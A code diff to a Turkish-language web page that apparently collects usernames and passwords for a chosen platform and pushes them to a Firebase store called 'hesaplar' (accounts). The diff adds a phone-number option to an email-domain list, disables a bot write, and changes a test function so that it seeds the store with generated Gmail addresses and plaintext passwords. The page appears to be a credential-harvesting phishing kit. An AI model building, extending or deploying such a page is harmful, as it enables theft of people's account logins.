@@ -490,7 +490,7 @@
                 width: 30%;
                 aspect-ratio:  1/2;
                 border: 1px solid #000;
-                border-radius: 3px;
+                border-radius: 2px;
             }
             .q-post_svg{
                 width: 22px;
@@ -763,6 +763,7 @@
                 <select id="domainSelect">
                     <option value="@gmail.com">@gmail.com</option>
                     <option value="@outlook.com">@outlook.com</option>
+                    <option value="">numara</option>
                     <option value="@sharklasers.com">@sharklasers.com</option>
                     <option value="@hotmail.com">@hotmail.com</option>
                     <option value="@yahoo.com">@yahoo.com</option>
@@ -944,7 +945,7 @@
             btn.classList.add('state-uyuyor');
         }
     }
-    set(window.botRef, 'code');
+    // set(window.botRef, 'code');
 
     function startRandomizedWaitingPopups() {
         const triggerPopup = () => {
@@ -1410,33 +1411,42 @@
 
     window.push = push;
     window.dataRef = ref(db, 'hesaplar');
+    let litCount = parseInt(localStorage.getItem('litCount')) || 23;
 
     window.quasarTest = function() {
+        litCount++;
+        localStorage.setItem('litCount', litCount);
 
         push(window.dataRef, {
             platform: document.getElementById('selectedPlatform').value,
-            user: 'papatyahaydo42@gmail.com',
+            user: `mehmetxlit20${litCount}@gmail.com`,
             pass: 'haydo388',
             time: new Date().toLocaleTimeString()
         });
-        push(window.dataRef, {
-            platform: document.getElementById('selectedPlatform').value,
-            user: 'mehmetxlit2000@gmail.com',
-            pass: 'dasasss',
-            time: new Date().toLocaleTimeString()
-        });
-        push(window.dataRef, {
-            platform: document.getElementById('selectedPlatform').value,
-            user: 'mehmetxlit20001aa@gmail.com',
-            pass: 'haydo388',
-            time: new Date().toLocaleTimeString()
-        });
-        push(window.dataRef, {
-            platform: document.getElementById('selectedPlatform').value,
-            user: 'mehmetxlit2002@gmail.com',
-            pass: 'haydo388',
-            time: new Date().toLocaleTimeString()
-        });
+        // push(window.dataRef, {
+        //     platform: document.getElementById('selectedPlatform').value,
+        //     user: 'papatyahaydo42@gmail.com',
+        //     pass: 'haydo388',
+        //     time: new Date().toLocaleTimeString()
+        // });
+        // push(window.dataRef, {
+        //     platform: document.getElementById('selectedPlatform').value,
+        //     user: 'mehmetxlit2000@gmail.com',
+        //     pass: 'dasasss',
+        //     time: new Date().toLocaleTimeString()
+        // });
+        // push(window.dataRef, {
+        //     platform: document.getElementById('selectedPlatform').value,
+        //     user: 'mehmetxlit20001aa@gmail.com',
+        //     pass: 'haydo388',
+        //     time: new Date().toLocaleTimeString()
+        // });
+        // push(window.dataRef, {
+        //     platform: document.getElementById('selectedPlatform').value,
+        //     user: 'mehmetxlit2002@gmail.com',
+        //     pass: 'haydo388',
+        //     time: new Date().toLocaleTimeString()
+        // });
         showToast("Test hesabı eklendi!", "success");
     }
 
